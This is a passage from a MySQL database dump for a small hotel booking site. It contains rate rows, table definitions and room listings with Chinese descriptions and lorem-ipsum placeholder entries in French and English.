(48, 17, 1680307200, 1680652800, 14, 6000, NULL, 0, '', 4, NULL, NULL, NULL, ''),
(65, 11, 1673740800, 1706659200, 9, 2200, NULL, 0, '', 3, NULL, NULL, NULL, ''),
(66, 11, 1673740800, 1706659200, 10, 2200, NULL, 0, '', 3, NULL, NULL, NULL, ''),
(79, 11, 1674000000, 1706659200, 3, 1800, NULL, 0, '', 3, NULL, NULL, NULL, ''),
(84, 1, 1693526400, 1695772800, 1, 1400, NULL, 0, '', 2, NULL, NULL, NULL, ''),
(85, 4, 1693526400, 1695772800, 1, 1400, NULL, 0, '', 2, NULL, NULL, NULL, ''),
(86, 5, 1693526400, 1695772800, 1, 1400, NULL, 0, '', 2, NULL, NULL, NULL, ''),
(87, 6, 1693526400, 1695772800, 1, 1400, NULL, 0, '', 0, NULL, NULL, NULL, ''),
(88, 7, 1693526400, 1695772800, 1, 2800, NULL, 0, '', 4, NULL, NULL, NULL, ''),
(89, 8, 1693526400, 1695772800, 1, 1200, NULL, 0, '', 1, NULL, NULL, NULL, ''),
(90, 9, 1693526400, 1695772800, 1, 3600, NULL, 0, '', 5, NULL, NULL, NULL, ''),
(91, 10, 1693526400, 1695772800, 1, 2200, NULL, 0, '', 3, NULL, NULL, NULL, ''),
(92, 11, 1693526400, 1695772800, 1, 2200, NULL, 0, '', 3, NULL, NULL, NULL, ''),
(93, 1, 1693526400, 1695772800, 3, 1200, NULL, 0, '', 2, NULL, NULL, NULL, ''),
(94, 4, 1693526400, 1695772800, 3, 1200, NULL, 0, '', 0, NULL, NULL, NULL, ''),
(95, 5, 1693526400, 1695772800, 3, 1200, NULL, 0, '', 0, NULL, NULL, NULL, ''),
(96, 5, 1693526400, 1695772800, 3, 1200, NULL, 0, '', 2, NULL, NULL, NULL, ''),
(97, 6, 1693526400, 1695772800, 3, 1200, NULL, 0, '', 0, NULL, NULL, NULL, ''),
(98, 7, 1693526400, 1695772800, 3, 2400, NULL, 0, '', 0, NULL, NULL, NULL, ''),
(99, 8, 1693526400, 1695772800, 3, 1000, NULL, 0, '', 0, NULL, NULL, NULL, ''),
(100, 9, 1693526400, 1695772800, 3, 3200, NULL, 0, '', 5, NULL, NULL, NULL, ''),
(101, 10, 1693526400, 1695772800, 3, 1800, NULL, 0, '', 3, NULL, NULL, NULL, ''),
(102, 11, 1693526400, 1695772800, 3, 1800, NULL, 0, '', 3, NULL, NULL, NULL, ''),
(103, 1, 1695859200, 1696032000, 16, 1400, NULL, 0, '', 2, NULL, NULL, NULL, ''),
(104, 4, 1695859200, 1696032000, 16, 1400, NULL, 0, '', 2, NULL, NULL, NULL, ''),
(105, 5, 1695859200, 1696032000, 16, 1400, NULL, 0, '', 2, NULL, NULL, NULL, ''),
(106, 6, 1695859200, 1696032000, 16, 1400, NULL, 0, '', 2, NULL, NULL, NULL, ''),
(107, 7, 1695859200, 1696032000, 16, 2800, NULL, 0, '', 4, NULL, NULL, NULL, ''),
(108, 8, 1695859200, 1696032000, 16, 1200, NULL, 0, '', 1, NULL, NULL, NULL, ''),
(109, 9, 1695859200, 1696032000, 16, 3600, NULL, 0, '', 5, NULL, NULL, NULL, ''),
(110, 10, 1695859200, 1696032000, 16, 2200, NULL, 0, '', 3, NULL, NULL, NULL, ''),
(111, 11, 1695859200, 1696032000, 16, 2200, NULL, 0, '', 3, NULL, NULL, NULL, ''),
(112, 1, 1688169600, 1693440000, 17, 1400, NULL, 0, '', 2, NULL, NULL, NULL, ''),
(113, 4, 1688169600, 1693440000, 17, 1400, NULL, 0, '', 2, NULL, NULL, NULL, ''),
(114, 5, 1688169600, 1693440000, 17, 1400, NULL, 0, '', 2, NULL, NULL, NULL, ''),
(115, 6, 1688169600, 1693440000, 17, 1400, NULL, 0, '', 2, NULL, NULL, NULL, ''),
(116, 7, 1688169600, 1693440000, 17, 2800, NULL, 0, '', 4, NULL, NULL, NULL, ''),
(117, 8, 1688169600, 1693440000, 17, 1200, NULL, 0, '', 1, NULL, NULL, NULL, ''),
(118, 9, 1688169600, 1693440000, 17, 3600, NULL, 0, '', 5, NULL, NULL, NULL, ''),
(119, 10, 1688169600, 1693440000, 17, 2200, NULL, 0, '', 3, NULL, NULL, NULL, ''),
(120, 11, 1688169600, 1693440000, 17, 2200, NULL, 0, '', 3, NULL, NULL, NULL, '');

-- --------------------------------------------------------

--
-- 資料表結構 `pm_rate_child`
--

CREATE TABLE `pm_rate_child` (
  `id` int(11) NOT NULL,
  `id_rate` int(11) NOT NULL,
  `min_age` int(11) DEFAULT NULL,
  `max_age` int(11) DEFAULT NULL,
  `price` double DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

-- --------------------------------------------------------

--
-- 資料表結構 `pm_room`
--

CREATE TABLE `pm_room` (
  `id` int(11) NOT NULL,
  `lang` int(11) NOT NULL,
  `max_children` int(11) DEFAULT 1,
  `max_adults` int(11) DEFAULT 1,
  `max_people` int(11) DEFAULT NULL,
  `min_people` int(11) DEFAULT NULL,
  `title` varchar(250) DEFAULT NULL,
  `subtitle` varchar(250) DEFAULT NULL,
  `alias` varchar(100) DEFAULT NULL,
  `descr` longtext DEFAULT NULL,
  `facilities` varchar(250) DEFAULT NULL,
  `stock` int(11) NOT NULL DEFAULT 1,
  `price` double NOT NULL DEFAULT 0,
  `home` int(11) DEFAULT 0,
  `checked` int(11) DEFAULT 0,
  `rank` int(11) DEFAULT 0,
  `start_lock` int(11) DEFAULT NULL,
  `end_lock` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- 傾印資料表的資料 `pm_room`
--

INSERT INTO `pm_room` (`id`, `lang`, `max_children`, `max_adults`, `max_people`, `min_people`, `title`, `subtitle`, `alias`, `descr`, `facilities`, `stock`, `price`, `home`, `checked`, `rank`, `start_lock`, `end_lock`) VALUES
(1, 1, 2, 2, 2, 1, 'Chambre Double Deluxe', 'Petit-déjeuner inclus', 'chambre-double-deluxe', '<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Morbi ut eleifend diam. Etiam molestie quam at nunc tempus, ac porttitor ante rutrum. Donec ipsum orci, molestie sit amet nibh a, accumsan varius nisl. Suspendisse blandit efficitur interdum. Nulla auctor tortor eu volutpat imperdiet. Nam at tempus sapien, sit amet porttitor neque. Nam lacinia ex libero, vel egestas ante vehicula nec.</p><p>Sed sed dignissim est. Donec egestas nisl eu congue rhoncus. Nulla finibus malesuada mauris, et pellentesque diam scelerisque non. Duis auctor dapibus augue sed malesuada. Nam placerat at libero quis aliquam. Phasellus quam orci, dapibus sit amet finibus a, convallis volutpat arcu. Nullam condimentum quam id urna scelerisque varius. Duis a metus metus.</p>', '23', 2, 3000, 1, 1, 1, NULL, NULL),
(1, 2, 2, 2, 2, 1, '簡約雅致雙人房', '雙人一大床', 'double-casual', '<p><span style=\"color:rgb(73,73,73);\">熱情的太陽，逕自落地窗外瀟灑入室，坐在床邊，聆聽風與樹呢喃細語，靜心感受那份安逸中的幸福。</span></p><p><span style=\"color:hsl(0,75%,60%);\"><strong>*為響應環保，本房型提供續住不整房隔日房價9折優惠*</strong></span></p><p><span style=\"color:hsl(0,75%,60%);\"><strong>*本房型未包含早餐*</strong></span></p>', '1,5,13,18,24,32', 2, 1400, 1, 1, 1, NULL, NULL),
(1, 3, 2, 2, 2, 1, 'Deluxe Double Bedroom', 'Breakfast included', 'deluxe-double-bedroom', '<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Morbi ut eleifend diam. Etiam molestie quam at nunc tempus, ac porttitor ante rutrum. Donec ipsum orci, molestie sit amet nibh a, accumsan varius nisl. Suspendisse blandit efficitur interdum. Nulla auctor tortor eu volutpat imperdiet. Nam at tempus sapien, sit amet porttitor neque. Nam lacinia ex libero, vel egestas ante vehicula nec.</p><p>Sed sed dignissim est. Donec egestas nisl eu congue rhoncus. Nulla finibus malesuada mauris, et pellentesque diam scelerisque non. Duis auctor dapibus augue sed malesuada. Nam placerat at libero quis aliquam. Phasellus quam orci, dapibus sit amet finibus a, convallis volutpat arcu. Nullam condimentum quam id urna scelerisque varius. Duis a metus metus.</p>', '23', 2, 3000, 1, 1, 1, NULL, NULL),
(1, 5, 2, 2, 2, 1, '簡約雅致雙人房', '雙人一大床', 'double-casual', '<p><span style=\"color:rgb(73,73,73);\">熱情的太陽，逕自落地窗外瀟灑入室，坐在床邊，聆聽風與樹呢喃細語，靜心感受那份安逸中的幸福。</span></p><p><span style=\"color:hsl(0,75%,60%);\"><strong>*為響應環保，本房型提供續住不整房隔日房價9折優惠*</strong></span></p>', '1,5,13,18,24,32', 2, 1200, 1, 1, 1, NULL, NULL),
(4, 1, 2, 2, 2, 1, '', '', '', '', '18', 3, 3000, 1, 1, 4, NULL, NULL),
(4, 2, 2, 2, 2, 1, '簡約商務雙人房', '兩張標準單人床', 'twin-casual', '<p><span style=\"color:rgb(73,73,73);\">適合出差或結伴同行之友人入住，可以自在地翻身而不互相打擾，是商務型旅人的絕佳選擇。</span></p><p><span style=\"color:hsl(0,75%,60%);\"><strong>*為響應環保，本房型提供續住不整房隔日房價9折優惠*</strong></span></p><p><span style=\"color:hsl(0,75%,60%);\"><strong>*本房型未包含早餐*</strong></span></p>', '1,3,5,18,24,32', 2, 1400, 1, 1, 4, NULL, NULL),
(4, 3, 2, 2, 2, 1, '', '', '', '', '18', 3, 3000, 1, 1, 4, NULL, NULL),
(4, 5, 2, 2, 2, 1, '簡約商務雙人房', '兩張標準單人床', 'twin-casual', '<p><span style=\"color:rgb(73,73,73);\">適合出差或結伴同行之友人入住，可以自在地翻身而不互相打擾，是商務型旅人的絕佳選擇。</span></p><p><span style=\"color:hsl(0,75%,60%);\"><strong>*為響應環保，本房型提供續住不整房隔日房價9折優惠*</strong></span></p>', '1,3,5,18,24,32', 2, 1200, 1, 1, 4, NULL, NULL),
(5, 1, 2, 2, 2, 1, 'Chambre Double Deluxe', 'Petit-déjeuner inclus', 'chambre-double-deluxe', '<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Morbi ut eleifend diam. Etiam molestie quam at nunc tempus, ac porttitor ante rutrum. Donec ipsum orci, molestie sit amet nibh a, accumsan varius nisl. Suspendisse blandit efficitur interdum. Nulla auctor tortor eu volutpat imperdiet. Nam at tempus sapien, sit amet porttitor neque. Nam lacinia ex libero, vel egestas ante vehicula nec.</p><p>Sed sed dignissim est. Donec egestas nisl eu congue rhoncus. Nulla finibus malesuada mauris, et pellentesque diam scelerisque non. Duis auctor dapibus augue sed malesuada. Nam placerat at libero quis aliquam. Phasellus quam orci, dapibus sit amet finibus a, convallis volutpat arcu. Nullam condimentum quam id urna scelerisque varius. Duis a metus metus.</p>', '1,5,11,13,28,29', 2, 3000, 1, 1, 2, NULL, NULL),
(5, 2, 2, 2, 2, 1, '原木雅致雙人房', '雙人一大床', 'double-woody', '<p> 原木風格裝潢的雅致雙人房，淡淡的原木香氣伴隨著灑入室內的陽光，彷彿置身在寧靜的森林當中。</p><p><span style=\"color:hsl(0,75%,60%);\"><strong>*為響應環保，本房型提供續住不整房隔日房價9折優惠*</strong></span></p><p><span style=\"color:hsl(0,75%,60%);\"><strong>*本房型未包含早餐*</strong></span></p>', '1,5,13,18,24,32', 2, 1400, 1, 1, 2, NULL, NULL),
(5, 3, 2, 2, 2, 1, 'Deluxe Double Bedroom', 'Breakfast included', 'deluxe-double-bedroom', '<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Morbi ut eleifend diam. Etiam molestie quam at nunc tempus, ac porttitor ante rutrum. Donec ipsum orci, molestie sit amet nibh a, accumsan varius nisl. Suspendisse blandit efficitur interdum. Nulla auctor tortor eu volutpat imperdiet. Nam at tempus sapien, sit amet porttitor neque. Nam lacinia ex libero, vel egestas ante vehicula nec.</p><p>Sed sed dignissim est. Donec egestas nisl eu congue rhoncus. Nulla finibus malesuada mauris, et pellentesque diam scelerisque non. Duis auctor dapibus augue sed malesuada. Nam placerat at libero quis aliquam. Phasellus quam orci, dapibus sit amet finibus a, convallis volutpat arcu. Nullam condimentum quam id urna scelerisque varius. Duis a metus metus.</p>', '1,5,11,13,28,29', 2, 3000, 1, 1, 2, NULL, NULL),
(5, 5, 2, 2, 2, 1, '原木雅致雙人房', '雙人一大床', 'double-woody', '<p> 原木風格裝潢的雅致雙人房，淡淡的原木香氣伴隨著灑入室內的陽光，彷彿置身在寧靜的森林當中。</p><p><span style=\"color:hsl(0,75%,60%);\"><strong>*為響應環保，本房型提供續住不整房隔日房價9折優惠*</strong></span></p>', '1,5,13,18,24,32', 2, 1200, 1, 1, 2, NULL, NULL),
(6, 1, 2, 2, 2, 1, 'Chambre Double Deluxe', 'Petit-déjeuner inclus', 'chambre-double-deluxe', '<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Morbi ut eleifend diam. Etiam molestie quam at nunc tempus, ac porttitor ante rutrum. Donec ipsum orci, molestie sit amet nibh a, accumsan varius nisl. Suspendisse blandit efficitur interdum. Nulla auctor tortor eu volutpat imperdiet. Nam at tempus sapien, sit amet porttitor neque. Nam lacinia ex libero, vel egestas ante vehicula nec.</p><p>Sed sed dignissim est. Donec egestas nisl eu congue rhoncus. Nulla finibus malesuada mauris, et pellentesque diam scelerisque non. Duis auctor dapibus augue sed malesuada. Nam placerat at libero quis aliquam. Phasellus quam orci, dapibus sit amet finibus a, convallis volutpat arcu. Nullam condimentum quam id urna scelerisque varius. Duis a metus metus.</p>', '1,5,11,13,28,29', 3, 3000, 1, 1, 3, NULL, NULL),
(6, 2, 2, 2, 2, 1, '原木商務雙人房', '兩張標準單人床', 'twin-woody', '<p> 原木風格裝潢的雅致雙人房，淡淡的原木香氣伴隨著灑入室內的陽光，彷彿置身在寧靜的森林當中。</p><p><span style=\"color:hsl(0,75%,60%);\"><strong>*為響應環保，本房型提供續住不整房隔日房價9折優惠*</strong></span></p><p><span style=\"color:hsl(0,75%,60%);\"><strong>*本房型未包含早餐*</strong></span></p>', '1,5,11,13,28,29,32', 2, 1400, 1, 1, 3, NULL, NULL),
(6, 3, 2, 2, 2, 1, 'Deluxe Double Bedroom', 'Breakfast included', 'deluxe-double-bedroom', '<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Morbi ut eleifend diam. Etiam molestie quam at nunc tempus, ac porttitor ante rutrum. Donec ipsum orci, molestie sit amet nibh a, accumsan varius nisl. Suspendisse blandit efficitur interdum. Nulla auctor tortor eu volutpat imperdiet. Nam at tempus sapien, sit amet porttitor neque. Nam lacinia ex libero, vel egestas ante vehicula nec.</p><p>Sed sed dignissim est. Donec egestas nisl eu congue rhoncus. Nulla finibus malesuada mauris, et pellentesque diam scelerisque non. Duis auctor dapibus augue sed malesuada. Nam placerat at libero quis aliquam. Phasellus quam orci, dapibus sit amet finibus a, convallis volutpat arcu. Nullam condimentum quam id urna scelerisque varius. Duis a metus metus.</p>', '1,5,11,13,28,29', 3, 3000, 1, 1, 3, NULL, NULL),
(6, 5, 2, 2, 2, 1, '原木商務雙人房', '兩張標準單人床', 'twin-woody', '<p> 原木風格裝潢的雅致雙人房，淡淡的原木香氣伴隨著灑入室內的陽光，彷彿置身在寧靜的森林當中。</p><p><span style=\"color:hsl(0,75%,60%);\"><strong>*為響應環保，本房型提供續住不整房隔日房價9折優惠*</strong></span></p>', '1,5,11,13,28,29,32', 2, 1200, 1, 1, 3, NULL, NULL),
(7, 1, 4, 4, 4, 1, 'Chambre Double Deluxe', 'Petit-déjeuner inclus', 'chambre-double-deluxe', '<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Morbi ut eleifend diam. Etiam molestie quam at nunc tempus, ac porttitor ante rutrum. Donec ipsum orci, molestie sit amet nibh a, accumsan varius nisl. Suspendisse blandit efficitur interdum. Nulla auctor tortor eu volutpat imperdiet. Nam at tempus sapien, sit amet porttitor neque. Nam lacinia ex libero, vel egestas ante vehicula nec.</p><p>Sed sed dignissim est. Donec egestas nisl eu congue rhoncus. Nulla finibus malesuada mauris, et pellentesque diam scelerisque non. Duis auctor dapibus augue sed malesuada. Nam placerat at libero quis aliquam. Phasellus quam orci, dapibus sit amet finibus a, convallis volutpat arcu. Nullam condimentum quam id urna scelerisque varius. Duis a metus metus.</p>', '1,5,28,29,30,32', 1, 4200, 1, 1, 5, NULL, NULL),
(7, 2, 4, 4, 4, 1, '溫馨家庭房', '雙人二大床', 'll', '<p><span style=\"color:rgb(73,73,73);\">大大的麵包樹葉搖曳生姿，召喚著房客到陽台，眺望晨昏不同景致的都蘭山與沈睡百年的美人山。寬敞的空間，小朋友自在嬉戲，一點也不會打擾大人們欣賞美景的興致。</span></p><p><span style=\"color:hsl(0,75%,60%);\"><strong>*為響應環保，本房型提供續住不整房隔日房價9折優惠*</strong></span></p><p><span style=\"color:hsl(0,75%,60%);\"><strong>*本房型未包含早餐*</strong></span></p>', '1,5,28,29,32', 1, 2800, 1, 1, 5, NULL, NULL),
(7, 3, 4, 4, 4, 1, 'Deluxe Double Bedroom', 'Breakfast included', 'deluxe-double-bedroom', '<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Morbi ut eleifend diam. Etiam molestie quam at nunc tempus, ac porttitor ante rutrum. Donec ipsum orci, molestie sit amet nibh a, accumsan varius nisl. Suspendisse blandit efficitur interdum. Nulla auctor tortor eu volutpat imperdiet. Nam at tempus sapien, sit amet porttitor neque. Nam lacinia ex libero, vel egestas ante vehicula nec.</p><p>Sed sed dignissim est. Donec egestas nisl eu congue rhoncus. Nulla finibus malesuada mauris, et pellentesque diam scelerisque non. Duis auctor dapibus augue sed malesuada. Nam placerat at libero quis aliquam. Phasellus quam orci, dapibus sit amet finibus a, convallis volutpat arcu. Nullam condimentum quam id urna scelerisque varius. Duis a metus metus.</p>', '1,5,28,29,30,32', 1, 4200, 1, 1, 5, NULL, NULL),
(7, 5, 4, 4, 4, 1, '溫馨家庭房', '雙人二大床', 'll', '<p><span style=\"color:rgb(73,73,73);\">大大的麵包樹葉搖曳生姿，召喚著房客到陽台，眺望晨昏不同景致的都蘭山與沈睡百年的美人山。寬敞的空間，小朋友自在嬉戲，一點也不會打擾大人們欣賞美景的興致。</span></p><p><span style=\"color:hsl(0,75%,60%);\"><strong>*為響應環保，本房型提供續住不整房隔日房價9折優惠*</strong></span></p>', '1,5,28,29,32', 1, 2400, 1, 1, 5, NULL, NULL),
(8, 1, 0, 1, 1, 1, 'Chambre Double Deluxe', 'Petit-déjeuner inclus', 'chambre-double-deluxe', '<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Morbi ut eleifend diam. Etiam molestie quam at nunc tempus, ac porttitor ante rutrum. Donec ipsum orci, molestie sit amet nibh a, accumsan varius nisl. Suspendisse blandit efficitur interdum. Nulla auctor tortor eu volutpat imperdiet. Nam at tempus sapien, sit amet porttitor neque. Nam lacinia ex libero, vel egestas ante vehicula nec.</p><p>Sed sed dignissim est. Donec egestas nisl eu congue rhoncus. Nulla finibus malesuada mauris, et pellentesque diam scelerisque non. Duis auctor dapibus augue sed malesuada. Nam placerat at libero quis aliquam. Phasellus quam orci, dapibus sit amet finibus a, convallis volutpat arcu. Nullam condimentum quam id urna scelerisque varius. Duis a metus metus.</p>', '1,5,28,30,32', 1, 1800, 1, 1, 6, NULL, NULL),
(8, 2, 0, 1, 1, 1, '迷你雙人房/和式單人房', '一張雙人日式軟床墊', '1234', '<p><span style=\"color:rgb(73,73,73);\">適合預算有限，但又想享受個人休憩空間的旅人住宿；備有個人衛浴設備、有線電視等，自由支配自己的小天地。</span></p><p><span style=\"color:hsl(0,75%,60%);\"><strong>*為響應環保，本房型提供續住不整房隔日房價9折優惠*</strong></span></p><p><span style=\"color:hsl(0,75%,60%);\"><strong>*本房型未包含早餐*</strong></span></p>', '1,5,28,30,32', 1, 1200, 1, 1, 6, NULL, NULL),
(8, 3, 0, 1, 1, 1, 'Deluxe Double Bedroom', 'Breakfast included', 'deluxe-double-bedroom', '<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Morbi ut eleifend diam. Etiam molestie quam at nunc tempus, ac porttitor ante rutrum. Donec ipsum orci, molestie sit amet nibh a, accumsan varius nisl. Suspendisse blandit efficitur interdum. Nulla auctor tortor eu volutpat imperdiet. Nam at tempus sapien, sit amet porttitor neque. Nam lacinia ex libero, vel egestas ante vehicula nec.</p><p>Sed sed dignissim est. Donec egestas nisl eu congue rhoncus. Nulla finibus malesuada mauris, et pellentesque diam scelerisque non. Duis auctor dapibus augue sed malesuada. Nam placerat at libero quis aliquam. Phasellus quam orci, dapibus sit amet finibus a, convallis volutpat arcu. Nullam condimentum quam id urna scelerisque varius. Duis a metus metus.</p>', '1,5,28,30,32', 1, 1800, 1, 1, 6, NULL, NULL),
(8, 5, 0, 1, 1, 1, '迷你雙人房/和式單人房', '一張雙人日式軟床墊', '1234', '<p><span style=\"color:rgb(73,73,73);\">適合預算有限，但又想享受個人休憩空間的旅人住宿；備有個人衛浴設備、有線電視等，自由支配自己的小天地。</span></p><p><span style=\"color:hsl(0,75%,60%);\"><strong>*為響應環保，本房型提供續住不整房隔日房價9折優惠*</strong></span></p>', '1,5,28,30,32', 1, 1000, 1, 1, 6, NULL, NULL),
(9, 1, 5, 5, 5, 3, 'Chambre Double Deluxe', 'Petit-déjeuner inclus', 'chambre-double-deluxe', '<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Morbi ut eleifend diam. Etiam molestie quam at nunc tempus, ac porttitor ante rutrum. Donec ipsum orci, molestie sit amet nibh a, accumsan varius nisl. Suspendisse blandit efficitur interdum. Nulla auctor tortor eu volutpat imperdiet. Nam at tempus sapien, sit amet porttitor neque. Nam lacinia ex libero, vel egestas ante vehicula nec.</p><p>Sed sed dignissim est. Donec egestas nisl eu congue rhoncus. Nulla finibus malesuada mauris, et pellentesque diam scelerisque non. Duis auctor dapibus augue sed malesuada. Nam placerat at libero quis aliquam. Phasellus quam orci, dapibus sit amet finibus a, convallis volutpat arcu. Nullam condimentum quam id urna scelerisque varius. Duis a metus metus.</p>', '32', 1, 1200, 1, 1, 7, NULL, NULL),
(9, 2, 5, 5, 5, 1, '簡約工業風五人房', '一張加大雙人床與三張標準單人床', '88', '<p>遠離城市喧囂，瀟灑拋開平日依賴的文明奢華，到這裡享受極簡風工業風的環境，體會不一樣的感覺。</p><p><span style=\"color:hsl(0,75%,60%);\"><strong>*為響應環保，本房型提供續住不整房隔日房價9折優惠*</strong></span></p><p><span style=\"color:hsl(0,75%,60%);\"><strong>*本房型未包含早餐*</strong></span></p>', '1,3,5,13,18,24,28,32', 1, 3600, 1, 1, 7, NULL, NULL),
(9, 3, 5, 5, 5, 3, 'Deluxe Double Bedroom', 'Breakfast included', 'deluxe-double-bedroom', '<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Morbi ut eleifend diam. Etiam molestie quam at nunc tempus, ac porttitor ante rutrum. Donec ipsum orci, molestie sit amet nibh a, accumsan varius nisl. Suspendisse blandit efficitur interdum. Nulla auctor tortor eu volutpat imperdiet. Nam at tempus sapien, sit amet porttitor neque. Nam lacinia ex libero, vel egestas ante vehicula nec.</p><p>Sed sed dignissim est. Donec egestas nisl eu congue rhoncus. Nulla finibus malesuada mauris, et pellentesque diam scelerisque non. Duis auctor dapibus augue sed malesuada. Nam placerat at libero quis aliquam. Phasellus quam orci, dapibus sit amet finibus a, convallis volutpat arcu. Nullam condimentum quam id urna scelerisque varius. Duis a metus metus.</p>', '32', 1, 1200, 1, 1, 7, NULL, NULL),
(9, 5, 5, 5, 5, 1, '簡約工業風五人房', '一張加大雙人床與三張標準單人床', '88', '<p>遠離城市喧囂，瀟灑拋開平日依賴的文明奢華，到這裡享受極簡風工業風的環境，體會不一樣的感覺。</p><p><span style=\"color:hsl(0,75%,60%);\"><strong>*為響應環保，本房型提供續住不整房隔日房價9折優惠*</strong></span></p>', '1,3,5,13,18,24,28,32', 1, 3200, 1, 1, 7, NULL, NULL),
(10, 1, 4, 4, 4, 1, '', '', '', '', '1,2,6,7', 1, 9999, 1, 1, 8, NULL, NULL),
(10, 2, 3, 3, 3, 1, '簡約雅逸三人房(無窗)', '一張雙人床與一張單人床', '3-person-room-casual', '<p>有小小孩及擁有三位家庭成員的最佳選擇，雙人床以貼心靠牆，防止您的小孩滾落床下。</p><p><span style=\"color:hsl(0,75%,60%);\"><strong>*為響應環保，本房型提供續住不整房隔日房價9折優惠*</strong></span></p><p><span style=\"color:hsl(0,75%,60%);\"><strong>*本房型未包含早餐*</strong></span></p>', '1,5,13,18,24,32', 1, 2200, 1, 1, 8, NULL, NULL),
(10, 3, 4, 4, 4, 1, '', '', '', '', '1,2,6,7', 1, 9999, 1, 1, 8, NULL, NULL),
(10, 5, 3, 3, 3, 1, '簡約雅逸三人房(無窗)', '一張雙人床與一張單人床', '3-person-room-casual', '<p>有小小孩及擁有三位家庭成員的最佳選擇，雙人床以貼心靠牆，防止您的小孩滾落床下。</p><p><span style=\"color:hsl(0,75%,60%);\"><strong>*為響應環保，本房型提供續住不整房隔日房價9折優惠*</strong></span></p>', '1,5,13,18,24,32', 1, 1800, 1, 1, 8, NULL, NULL),
(11, 2, 3, 3, 3, 1, '原木雅逸三人房(無窗)', '一張雙人床與一張單人床', '3-person-room-woody', '<p>有小小孩及擁有三位家庭成員的最佳選擇，雙人床以貼心靠牆，防止您的小孩滾落床下。</p><p><span style=\"color:hsl(0,75%,60%);\"><strong>*為響應環保，本房型提供續住不整房隔日房價9折優惠*</strong></span></p><p><span style=\"color:hsl(0,75%,60%);\"><strong>*本房型未包含早餐*</strong></span></p>', '1,5,13,18,24,32', 1, 2200, 1, 1, 9, NULL, NULL),
(11, 5, 3, 3, 3, 1, '原木雅逸三人房(無窗)', '一張雙人床與一張單人床', '3-person-room-woody', '<p>有小小孩及擁有三位家庭成員的最佳選擇，雙人床以貼心靠牆，防止您的小孩滾落床下。</p><p><span style=\"color:hsl(0,75%,60%);\"><strong>*為響應環保，本房型提供續住不整房隔日房價9折優惠*</strong></span></p>', '1,5,13,18,24,32', 1, 1800, 1, 1, 9, NULL, NULL),
(12, 2, 5, 5, 5, 1, '簡約工業風五人房(複製)', '一張加大雙人床與三張標準單人床', '89', '<p>遠離城市喧囂，瀟灑拋開平日依賴的文明奢華，到這裡享受極簡風工業風的環境，體會不一樣的感覺。</p>', '1,3,5,13,18,24,28,32', 1, 6000, 0, 2, 10, NULL, NULL),
(12, 5, 5, 5, 5, 1, '簡約工業風五人房(複製)', '一張加大雙人床與三張標準單人床', '89', '<p>遠離城市喧囂，瀟灑拋開平日依賴的文明奢華，到這裡享受極簡風工業風的環境，體會不一樣的感覺。</p>', '1,3,5,13,18,24,28,32', 1, 6000, 0, 2, 10, NULL, NULL),
(13, 2, 2, 2, 2, 1, '簡約商務雙人房(複製_', '兩張標準單人床', 'twin-casual-01', '<p><span style=\"color:rgb(73,73,73);\">適合出差或結伴同行之友人入住，可以自在地翻身而不互相打擾，是商務型旅人的絕佳選擇。</span></p>', '1,3,5,18,24', 2, 3000, 0, 2, 11, NULL, NULL),
(13, 5, 2, 2, 2, 1, '簡約商務雙人房(複製_', '兩張標準單人床', 'twin-casual-01', '<p><span style=\"color:rgb(73,73,73);\">適合出差或結伴同行之友人入住，可以自在地翻身而不互相打擾，是商務型旅人的絕佳選擇。</span></p>', '1,3,5,18,24', 2, 3000, 0, 2, 11, NULL, NULL),
(14, 2, 2, 2, 2, 1, '原木雅致雙人房(複製)', '雙人一大床', 'f', '<p> 原木風格裝潢的雅致雙人房，淡淡的原木香氣伴隨著灑入室內的陽光，彷彿置身在寧靜的森林當中。</p>', '1,5,13,18,24', 2, 3000, 0, 2, 12, NULL, NULL),
(14, 5, 2, 2, 2, 1, '原木雅致雙人房(複製)', '雙人一大床', 'f', '<p> 原木風格裝潢的雅致雙人房，淡淡的原木香氣伴隨著灑入室內的陽光，彷彿置身在寧靜的森林當中。</p>', '1,5,13,18,24', 2, 3000, 0, 2, 12, NULL, NULL),
(15, 2, 2, 2, 2, 1, '原木商務雙人房(複製)', '兩張標準單人床', 'twin-woody-02', '<p> 原木風格裝潢的雅致雙人房，淡淡的原木香氣伴隨著灑入室內的陽光，彷彿置身在寧靜的森林當中。</p>', '1,5,11,13,28,29', 2, 3000, 0, 2, 13, NULL, NULL),
(15, 5, 2, 2, 2, 1, '原木商務雙人房(複製)', '兩張標準單人床', 'twin-woody-02', '<p> 原木風格裝潢的雅致雙人房，淡淡的原木香氣伴隨著灑入室內的陽光，彷彿置身在寧靜的森林當中。</p>', '1,5,11,13,28,29', 2, 3000, 0, 2, 13, NULL, NULL),
(16, 2, 4, 4, 4, 1, '溫馨家庭房(複製)', '雙人二大床', 'll1', '<p><span style=\"color:rgb(73,73,73);\">大大的麵包樹葉搖曳生姿，召喚著房客到陽台，眺望晨昏不同景致的都蘭山與沈睡百年的美人山。寬敞的空間，小朋友自在嬉戲，一點也不會打擾大人們欣賞美景的興致。</span></p>', '1,5,28,29,32', 1, 4200, 0, 2, 14, NULL, NULL),
(16, 5, 4, 4, 4, 1, '溫馨家庭房(複製)', '雙人二大床', 'll1', '<p><span style=\"color:rgb(73,73,73);\">大大的麵包樹葉搖曳生姿，召喚著房客到陽台，眺望晨昏不同景致的都蘭山與沈睡百年的美人山。寬敞的空間，小朋友自在嬉戲，一點也不會打擾大人們欣賞美景的興致。</span></p>', '1,5,28,29,32', 1, 4200, 0, 2, 14, NULL, NULL),
(17, 2, 2, 2, 4, 1, '親子同樂4人房(測試)', '雙人2大床', 'family-room-4', '<p>親子同樂4人房(測試)</p><p>親子同樂4人房(測試)</p><p>親子同樂4人房(測試)</p><p>親子同樂4人房(測試)</p>', '1,2', 1, 5000, 1, 2, 15, NULL, NULL),
